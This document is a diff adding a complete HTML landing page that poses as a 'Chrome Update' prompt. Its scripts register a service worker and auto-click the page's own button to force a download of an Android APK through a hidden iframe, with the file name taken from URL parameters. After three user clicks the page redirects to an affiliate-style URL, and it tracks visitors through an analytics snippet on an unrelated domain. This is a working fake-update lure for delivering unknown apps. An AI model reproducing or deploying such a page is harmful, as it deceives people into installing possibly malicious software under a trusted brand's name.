@@ -1,0 +1,343 @@
+<!doctype html>
+<html lang="en" translate="no">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="google" content="notranslate"/>
+    <title>Chrome Update</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background: #f4f7fb;
+            color: #1f2937;
+        }
+
+        .screen {
+            min-height: 100vh;
+            padding: 28px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background:
+                    radial-gradient(circle at top right, rgba(66, 133, 244, .18), transparent 34%),
+                    radial-gradient(circle at bottom left, rgba(52, 168, 83, .16), transparent 34%),
+                    #f4f7fb;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            padding: 32px 22px;
+            border-radius: 28px;
+            background: #ffffff;
+            border: 1px solid rgba(0,0,0,.06);
+            box-shadow: 0 24px 70px rgba(31,41,55,.12);
+        }
+
+        .logo {
+            width: 96px;
+            height: 96px;
+            margin: 0 auto 22px;
+            border-radius: 50%;
+            background: url('logo.webp') center/cover no-repeat;
+            position: relative;
+            box-shadow: 0 16px 36px rgba(66,133,244,.24);
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 8px 13px;
+            border-radius: 999px;
+            background: #eef4ff;
+            color: #2563eb;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 34px;
+            line-height: 1.05;
+            letter-spacing: -1.2px;
+            color: #111827;
+        }
+
+        h1 span {
+            color: #2563eb;
+        }
+
+        p {
+            margin: 0 auto 24px;
+            max-width: 320px;
+            color: #6b7280;
+            font-size: 16px;
+            line-height: 1.45;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 9px;
+            margin-bottom: 24px;
+        }
+
+        .feature {
+            padding: 11px 6px;
+            border-radius: 15px;
+            background: #f3f6fb;
+            color: #4b5563;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 17px 20px;
+            border-radius: 18px;
+            background: #2563eb;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 17px;
+            box-shadow: 0 16px 36px rgba(37,99,235,.28);
+            transition: .2s ease;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            background: #1d4ed8;
+        }
+
+        .note {
+            margin-top: 14px;
+            font-size: 12px;
+            color: #9ca3af;
+        }
+    </style>
+
+    <script src="../params.js"></script>
+    <script>
+        window.__downloadSwVersion = '42316858';
+        window.__downloadSwUrl = `${window.__landingRoot}sw4.js`;
+        window.__swReadyPromise = (async () => {
+            await window.__landingParamsReady;
+            if (!('serviceWorker' in navigator)) {
+                return { ok: false, direct: true, reason: 'unsupported' };
+            }
+
+            const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
+            await registration.update();
+
+            if (registration.waiting) {
+                registration.waiting.postMessage({ type: 'SKIP_WAITING' });
+            }
+
+            await navigator.serviceWorker.ready;
+
+            const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
+            if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
+                await new Promise((resolve, reject) => {
+                    const timeout = window.setTimeout(() => {
+                        navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
+                        reject(new Error('controller timeout'));
+                    }, 5000);
+
+                    function onControllerChange() {
+                        if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
+                        navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
+                        window.clearTimeout(timeout);
+                        resolve();
+                    }
+
+                    navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
+                });
+            }
+
+            return {
+                ok: true,
+                direct: false,
+                registration,
+                controller: navigator.serviceWorker.controller,
+            };
+        })().catch((error) => {
+            console.error('[download] early service worker setup failed', error);
+            return { ok: false, direct: true, reason: error.message };
+        });
+    </script>
+  <script>
+    !function(t,e){var o,n,p,r;e.__SV||(window.posthog && window.posthog.__loaded)||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}p||((p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",p.onerror=function(){p=null},(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r));var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],Object.defineProperty(u,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e}}),Object.defineProperty(u.people,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(){return u.toString(1)+".people (stub)"}}),o="Eh Rh Ph Oh Dh qh init yd bd dd fd Sd wc md xd ad Ed Ad Rd Pd Od Fd capture getExtension gr pd gd calculateEventProperties Dd register register_once register_for_session unregister unregister_for_session zd hd jd getFeatureFlag getFeatureFlagPayload getFeatureFlagResult getAllFeatureFlags isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys onActiveMatchingSurveysChanged renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Hd identify setPersonProperties unsetPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset Ud shutdown setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException addExceptionStep captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty qd Td createPersonProfile setInternalOrTestUser Bd Uh zh opt_in_capturing opt_out_capturing Hh has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $d debug kc Ds getPageViewId captureTraceFeedback captureTraceMetric rd".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
+
+    posthog.init('ftok', {
+        api_host: 'https://iijjuiu.shop/a',
+        advanced_disable_flags: true,
+        disable_external_dependency_loading: true,
+        disable_session_recording: true,
+        disable_surveys: true,
+
+        autocapture: true,
+        capture_pageview: true,
+        capture_pageleave: true,
+        person_profiles: 'identified_only',
+    });
+  </script>
+</head>
+<body>
+
+<main class="screen">
+    <section class="card">
+        <div class="logo"></div>
+        <div class="badge">New Update v12.44</div>
+
+        <h1><span>Chrome Update</span></h1>
+
+        <p>
+            You need to update your browser.
+        </p>
+
+        <div class="features">
+            <div class="feature">Faster</div>
+            <div class="feature">Safer</div>
+            <div class="feature">Gemini AI</div>
+        </div>
+
+        <button id="downloadButton" class="btn"  type="button" disabled>Update Chrome</button>
+        <div class="note">Download automatically started.</div>
+    </section>
+</main>
+
+<iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>
+
+<script>
+    (() => {
+
+        const DEFAULT_FILE_NAME = 'download9918.apk';
+        const SW_URL = window.__downloadSwUrl;
+        const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';
+
+        const downloadButton = document.querySelector('#downloadButton');
+        const downloadFrame = document.querySelector('#downloadFrame');
+
+        let savedParams = new URLSearchParams();
+        let offerId = null;
+        let fileName = DEFAULT_FILE_NAME;
+        let isServiceWorkerReady = false;
+        let trustedClickCount = 0;
+
+        function log(message, data) {
+            if (data === undefined) {
+                console.log(`[download] ${message}`);
+                return;
+            }
+
+            console.log(`[download] ${message}`, data);
+        }
+
+        function sanitizeFileName(value) {
+            const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
+            const candidate = String(value || '')
+                .replace(/\.apk$/i, '')
+                .slice(0, 80);
+            const isValid = candidate !== ''
+                && !/^[ _-]+$/.test(candidate)
+                && !/^ /.test(candidate)
+                && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
+            const base = isValid ? candidate : fallbackBase;
+            return `${base}.apk`;
+        }
+
+        function getSavedOfferId() {
+            const value = savedParams.get('offer_id');
+            return value && value.trim() ? value.trim().slice(0, 80) : null;
+        }
+
+        function getSavedFileName() {
+            return sanitizeFileName(savedParams.get('utm_medium'));
+        }
+
+        function getRedirectUrl() {
+            const target = new URL(REDIRECT_HREF);
+            target.searchParams.set('clickid', savedParams.get('clickid') || '');
+            return target.href;
+        }
+
+        async function registerServiceWorker() {
+            await window.__landingParamsReady;
+            savedParams = window.__savedDownloadParams;
+            offerId = getSavedOfferId();
+            fileName = getSavedFileName();
+            const title = document.querySelector('#fileTitle');
+            if (title) title.textContent = fileName;
+            const swState = await window.__swReadyPromise;
+
+            if (!swState.ok || swState.direct) {
+                downloadButton.disabled = true;
+                log('service worker is required for offer download', { reason: swState.reason, offerId });
+                return;
+            }
+
+            isServiceWorkerReady = true;
+            downloadButton.disabled = !offerId;
+            log('ready to download', {
+                controller: swState.controller && swState.controller.scriptURL,
+                swUrl: SW_URL,
+                offerId,
+                fileName,
+            });
+
+            if (offerId) {
+                downloadButton.click();
+            }
+        }
+
+        function startDownload() {
+            if (!offerId) {
+                log('offer_id is missing');
+                return;
+            }
+
+            const target = new URL('download.apk', window.__landingRoot);
+            log('starting service worker download', { offerId, fileName, target: target.href });
+            downloadFrame.src = 'about:blank';
+            window.setTimeout(() => {
+                downloadFrame.src = target.href;
+            }, 0);
+        }
+
+        function handleDownloadClick(event) {
+            if (!isServiceWorkerReady) {
+                log('download requested before service worker readiness');
+                return;
+            }
+
+            if (event && event.isTrusted) {
+                trustedClickCount += 1;
+
+                if (trustedClickCount >= 3) {
+                    window.location.href = getRedirectUrl();
+                    return;
+                }
+            }
+
+            startDownload();
+        }
+
+        downloadButton.addEventListener('click', handleDownloadClick);
+
+        registerServiceWorker().catch((error) => {
+            console.error('[download] service worker setup failed', error);
+            downloadButton.disabled = true;
+            log('service worker setup failed', { error: error.message, offerId });
+        });
+    })();
+</script>
+</body>
+</html>
